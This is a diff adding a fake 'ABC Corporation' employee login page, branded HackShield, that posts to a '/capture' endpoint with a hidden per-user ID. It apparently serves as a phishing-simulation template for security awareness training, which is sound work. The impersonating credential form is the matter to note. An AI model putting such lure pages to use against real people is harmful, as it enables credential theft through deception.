@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>HackShield | Secure Login</title>
+<style>
+body{background:#f4f6f9;font-family:Arial}
+.box{width:360px;margin:100px auto;background:white;padding:30px;border-radius:8px}
+button{width:100%;padding:10px;background:#003366;color:white;border:none}
+</style>
+</head>
+<body>
+
+<div class="box">
+<h2 style="text-align:center;color:#003366">ABC Corporation</h2>
+<p style="text-align:center">Employee Portal</p>
+
+<form method="post" action="/capture">
+<input type="hidden" name="user_id" value="{{user_id}}">
+<input placeholder="Employee Email" required><br><br>
+<input type="password" placeholder="Password" required><br><br>
+<button>Login</button>
+</form>
+
+</div>
+</body>
+</html>
